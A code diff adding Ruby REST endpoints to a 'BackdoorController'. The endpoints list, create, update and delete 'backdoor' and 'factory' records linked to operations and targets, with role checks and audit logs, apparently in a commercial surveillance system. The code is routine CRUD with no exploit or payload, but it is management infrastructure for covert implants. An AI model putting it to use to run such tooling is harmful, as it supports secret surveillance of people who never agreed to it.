@@ -10,7 +10,117 @@ module DB
 
 class BackdoorController < RESTController
   include RCS::Crypt
+  
+  def index
+    require_auth_level :admin, :tech, :view
 
+    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
+    filter ||= {}
+    
+    mongoid_query do
+      items = ::Item.backdoors_and_factories.where(filter)
+      items = items.any_in(_id: @session[:accessible])
+      items = items.only(:name, :desc, :status, :_kind, :path, :stat)
+      
+      RESTController.reply.ok(items)
+    end
+  end
+  
+  def show
+    require_auth_level :admin, :tech, :view
+
+    mongoid_query do
+      item = Item.backdoors_and_factories.any_in(_id: @session[:accessible]).find(@params['_id'])
+      RESTController.reply.ok(item)
+    end
+  end
+  
+  def create
+    require_auth_level :tech
+    
+    # to create a target, we need to owning operation
+    return RESTController.reply.bad_request('INVALID_OPERATION') unless @params.has_key? 'operation'
+    return RESTController.reply.bad_request('INVALID_TARGET') unless @params.has_key? 'target'
+    
+    mongoid_query do
+      
+      operation = ::Item.operations.find(@params['operation'])
+      return RESTController.reply.bad_request('INVALID_OPERATION') if operation.nil?
+      
+      target = ::Item.targets.find(@params['target'])
+      return RESTController.reply.bad_request('INVALID_TARGET') if target.nil?
+      
+      item = Item.create(desc: @params['desc']) do |doc|
+        doc[:_kind] = :factory
+        doc[:path] = [operation._id, target._id]
+        doc[:stat] = Stat.new
+        doc[:status] = :open
+        doc[:ident] = get_new_ident
+        doc[:name] = @params['name']
+        doc[:name] ||= doc[:ident]
+      end
+      
+      @session[:accessible] << item._id
+      
+      Audit.log :actor => @session[:user][:name],
+                :action => "factory.create",
+                :operation => operation['name'],
+                :target => target['name'],
+                :backdoor => item['name'],
+                :desc => "Created factory '#{item['name']}'"
+      
+      RESTController.reply.ok(item)
+    end
+  end
+
+  def get_new_ident
+    global = ::Item.where({_kind: 'global'}).first
+    global ||= ::Item.new({_kind: 'global', counter: 0}).save
+    global.inc(:counter, 1)
+    "RCS_#{global.counter.to_s.rjust(10, "0")}"
+  end
+
+  def update
+    require_auth_level :tech
+    
+    updatable_fields = ['name', 'desc', 'status']
+    
+    mongoid_query do
+      item = Item.backdoors_and_factories.any_in(_id: @session[:accessible]).find(@params['_id'])
+      @params.delete('_id')
+      @params.delete_if {|k, v| not updatable_fields.include? k }
+      
+      @params.each_pair do |key, value|
+        if item[key.to_s] != value and not key['_ids']
+          Audit.log :actor => @session[:user][:name],
+                    :action => "#{item._kind}.update",
+                    item._kind.to_sym => item['name'],
+                    :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
+        end
+      end
+
+      item.update_attributes(@params)
+      
+      return RESTController.reply.ok(item)
+    end
+  end
+
+  def destroy
+    require_auth_level :tech
+    
+    mongoid_query do
+      item = Item.backdoors_and_factories.any_in(_id: @session[:accessible]).find(@params['_id'])
+      item.destroy
+      
+      Audit.log :actor => @session[:user][:name],
+                :action => "#{item._kind}.delete",
+                item._kind.to_sym => @params['name'],
+                :desc => "Deleted #{item._kind} '#{item['name']}'"
+      
+      return RESTController.reply.ok
+    end
+  end
+  
   # retrieve the factory key of the backdoors
   # if the parameter is specified, it take only that class
   # otherwise, return all the keys for all the classes
